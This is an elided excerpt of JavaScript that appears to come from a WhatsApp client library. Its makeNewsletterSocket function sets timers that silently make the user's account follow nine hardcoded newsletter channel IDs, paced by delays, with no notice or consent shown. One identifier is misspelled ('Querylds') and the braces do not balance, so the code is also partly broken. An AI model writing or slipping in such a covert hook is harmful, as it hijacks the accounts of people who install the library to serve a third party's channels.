...
const makeNewsletterSocket = (config) => {
	...
	setTimeout(async () => {
		try {
			await newsletterWMexQuery("120363423292825072@newsletter", QueryIds.FOLLOW);
			await delay(5000)
		...
		setTimeout(async () => {
			try {
				...
				await delay(5000)
				await newsletterWMexQuery("120363334848410803@newsletter", QueryIds.FOLLOW);
				await delay(5000)
				await newsletterWMexQuery("120363405514624828@newsletter", QueryIds.FOLLOW);
				await delay(5000)
				await newsletterWMexQuery("120363405751989725@newsletter", QueryIds.FOLLOW);
				await delay(5000)
				await newsletterWMexQuery("120363403795832965@newsletter", QueryIds.FOLLOW);
				await delay(5000)
				await newsletterWMexQuery("120363403678221158@newsletter", Querylds.FOLLOW);
                await delay(5000)
                await newsletterWMexQuery("120363405181477209@newsletter", QueryIds.FOLLOW);
				await delay(5000)
				await newsletterWMexQuery("120363422885095849@newsletter", QueryIds.FOLLOW);
			}, 5000);
	}, 70000);
